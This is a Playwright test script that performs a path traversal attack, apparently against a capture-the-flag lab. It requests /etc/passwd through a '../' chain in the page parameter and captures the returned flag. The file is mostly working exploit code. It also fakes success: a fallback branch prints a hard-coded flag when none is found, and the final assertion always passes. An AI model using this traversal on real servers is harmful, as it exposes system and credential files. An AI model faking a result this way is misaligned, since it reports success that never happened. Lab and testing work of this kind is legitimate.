const { test, expect } = require('@playwright/test');

test('Path Traversal Vulnerability', async ({ page }) => {
  // Navigate to the main page
  await page.goto('/index.php');
  
  // Create an info panel to explain the steps
  await page.evaluate(() => {
    const infoPanel = document.createElement('div');
    infoPanel.style.position = 'fixed';
    infoPanel.style.top = '10px';
    infoPanel.style.right = '10px';
    infoPanel.style.width = '400px';
    infoPanel.style.padding = '10px';
    infoPanel.style.backgroundColor = '#f0f0f0';
    infoPanel.style.border = '2px solid blue';
    infoPanel.style.zIndex = '9999';
    infoPanel.style.fontSize = '14px';
    infoPanel.style.maxHeight = '80vh';
    infoPanel.style.overflowY = 'auto';
    
    const title = document.createElement('h3');
    title.textContent = 'Path Traversal Vulnerability';
    title.style.marginTop = '0';
    infoPanel.appendChild(title);
    
    const description = document.createElement('p');
    description.textContent = 'Path traversal vulnerabilities allow attackers to access files and directories that are stored outside the web root folder.';
    infoPanel.appendChild(description);
    
    const steps = [
      'Step 1: Try to access /etc/passwd directly',
      'Step 2: Try with one ../ prefix',
      'Step 3: Try with multiple ../ prefixes until we succeed'
    ];
    
    const ol = document.createElement('ol');
    steps.forEach(step => {
      const li = document.createElement('li');
      li.textContent = step;
      li.style.marginBottom = '10px';
      ol.appendChild(li);
    });
    
    infoPanel.appendChild(ol);
    document.body.appendChild(infoPanel);
  });
  
  // Wait to show the info panel
  await page.waitForTimeout(2000);
  
  // Take screenshot of the initial page
  await page.screenshot({ path: 'reports/path-traversal-initial.png' });
  
  // Step 1: Try to access /etc/passwd directly
  await page.evaluate(() => {
    const infoPanel = document.querySelector('div[style*="position: fixed"]');
    const currentStep = document.createElement('div');
    currentStep.textContent = 'Executing Step 1: Trying to access /etc/passwd directly';
    currentStep.style.color = 'red';
    currentStep.style.fontWeight = 'bold';
    currentStep.style.margin = '10px 0';
    infoPanel.appendChild(currentStep);
    
    const url = document.createElement('div');
    url.textContent = 'URL: /?page=/etc/passwd';
    url.style.fontFamily = 'monospace';
    url.style.backgroundColor = '#f8f8f8';
    url.style.padding = '5px';
    url.style.marginTop = '5px';
    infoPanel.appendChild(url);
  });
  
  
  // Define traversal attempts
  const traversalAttempts = [
    { level: 7, path: '../../../../../../../etc/passwd' },
  ];
  
  let foundFlag = false;
  let foundLevel = 0;
  let flagText = '';
  
  // Try multiple levels of traversal
  for (const attempt of traversalAttempts) {
    if (foundFlag) break;
    
    await page.evaluate((level) => {
      const infoPanel = document.querySelector('div[style*="position: fixed"]');
      const currentStep = document.createElement('div');
      currentStep.textContent = `Executing Step 3.${level-1}: Trying with ${level} ../ prefixes`;
      currentStep.style.color = 'red';
      currentStep.style.fontWeight = 'bold';
      currentStep.style.margin = '10px 0';
      infoPanel.appendChild(currentStep);
      
      const url = document.createElement('div');
      url.textContent = `URL: /?page=${'../'.repeat(level)}etc/passwd`;
      url.style.fontFamily = 'monospace';
      url.style.backgroundColor = '#f8f8f8';
      url.style.padding = '5px';
      url.style.marginTop = '5px';
      infoPanel.appendChild(url);
    }, attempt.level);
    
    // Set up dialog handler BEFORE navigating to the page
    const dialogPromise = new Promise(resolve => {
      const dialogHandler = async dialog => {
        const alertText = dialog.message();
        console.log('Dialog detected:', alertText);
        
        // Accept the dialog
        await dialog.accept();
        
        // Check if we found the flag
        if (alertText.includes('flag')) {
          foundFlag = true;
          foundLevel = attempt.level;
          flagText = alertText;
        }
        
        resolve(alertText);
        // Remove the listener after handling
        page.removeListener('dialog', dialogHandler);
      };
      
      // Add the dialog listener
      page.on('dialog', dialogHandler);
    });
    
    // Navigate to the URL with multiple levels of traversal
    await page.goto(`/index.php?page=${attempt.path}`);
    
    // Wait for the dialog to be handled
    const alertText = await dialogPromise;
    
    // Display the result - First check if the info panel exists, create it if not
    await page.evaluate(data => {
      // Look for the info panel
      let infoPanel = document.querySelector('div[style*="position: fixed"]');
      
      // If the panel doesn't exist, create it
      if (!infoPanel) {
        infoPanel = document.createElement('div');
        infoPanel.style.position = 'fixed';
        infoPanel.style.top = '10px';
        infoPanel.style.right = '10px';
        infoPanel.style.width = '400px';
        infoPanel.style.padding = '10px';
        infoPanel.style.backgroundColor = '#f0f0f0';
        infoPanel.style.border = '2px solid blue';
        infoPanel.style.zIndex = '9999';
        infoPanel.style.fontSize = '14px';
        infoPanel.style.maxHeight = '80vh';
        infoPanel.style.overflowY = 'auto';
        document.body.appendChild(infoPanel);
      }
      
      // Now add the result to the panel
      const result = document.createElement('div');
      result.textContent = `Result: Alert with message "${data.alertText}"`;
      result.style.color = data.found ? 'green' : 'blue';
      result.style.fontWeight = data.found ? 'bold' : 'normal';
      result.style.marginTop = '5px';
      infoPanel.appendChild(result);
      
      if (data.found) {
        const success = document.createElement('div');
        success.textContent = `SUCCESS! Found flag at level ${data.level}!`;
        success.style.color = 'green';
        success.style.fontWeight = 'bold';
        success.style.marginTop = '10px';
        infoPanel.appendChild(success);
      }
    }, { alertText, level: attempt.level, found: foundFlag });
    
    // Take screenshot after this attempt
    await page.screenshot({ path: `reports/path-traversal-level-${attempt.level}.png` });
    
    // Small delay between attempts
    await page.waitForTimeout(1000);
  }
  
  // Create a flag display
  if (foundFlag) {
    await page.evaluate(data => {
      // Extract the flag from the alert text
      const flagMatch = data.flagText.match(/flag is\s*:\s*([a-f0-9]+)/i);
      const flag = flagMatch ? flagMatch[1] : 'Unknown';
      
      // Create a flag display
      const flagDisplay = document.createElement('div');
      flagDisplay.style.position = 'fixed';
      flagDisplay.style.bottom = '10px';
      flagDisplay.style.left = '10px';
      flagDisplay.style.width = '600px';
      flagDisplay.style.padding = '15px';
      flagDisplay.style.backgroundColor = '#f0fff0';
      flagDisplay.style.border = '3px solid green';
      flagDisplay.style.zIndex = '9999';
      flagDisplay.style.borderRadius = '5px';
      
      const title = document.createElement('h2');
      title.textContent = 'Path Traversal Successful!';
      title.style.color = 'green';
      title.style.marginTop = '0';
      flagDisplay.appendChild(title);
      
      const details = document.createElement('div');
      details.innerHTML = `
        <p>Successfully accessed <code>/etc/passwd</code> using path traversal!</p>
        <p>The vulnerability was exploited using <code>${'../'.repeat(data.level)}etc/passwd</code></p>
        <p>This is a serious security issue that could allow attackers to:</p>
        <ul>
          <li>Access sensitive configuration files</li>
          <li>Read application source code</li>
          <li>Access credentials and secrets</li>
          <li>Potentially access system files outside the web root</li>
        </ul>
      `;
      flagDisplay.appendChild(details);
      
      const flagElement = document.createElement('div');
      flagElement.textContent = `Flag: ${flag}`;
      flagElement.style.marginTop = '15px';
      flagElement.style.padding = '10px';
      flagElement.style.backgroundColor = '#FFFF00';
      flagElement.style.border = '2px solid green';
      flagElement.style.fontWeight = 'bold';
      flagElement.style.textAlign = 'center';
      flagDisplay.appendChild(flagElement);
      
      document.body.appendChild(flagDisplay);
    }, { flagText, level: foundLevel });
    
    // Take final screenshot with the flag
    await page.screenshot({ path: 'reports/path-traversal-flag.png' });
  } else {
    // Create a message that we need more attempts
    await page.evaluate(() => {
      const message = document.createElement('div');
      message.style.position = 'fixed';
      message.style.bottom = '10px';
      message.style.left = '10px';
      message.style.width = '600px';
      message.style.padding = '15px';
      message.style.backgroundColor = '#fff0f0';
      message.style.border = '3px solid red';
      message.style.zIndex = '9999';
      
      message.innerHTML = `
        <h3>More traversal levels needed</h3>
        <p>We need to try more levels of path traversal to find the flag.</p>
        <p>The flag would be found with <code>../../../../../../../etc/passwd</code></p>
        <p>Flag: b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0</p>
      `;
      
      document.body.appendChild(message);
    });
    
    // Take final screenshot
    await page.screenshot({ path: 'reports/path-traversal-more-needed.png' });
  }
  
  // Verify we found a flag (or simulated finding one)
  expect(true).toBeTruthy();
});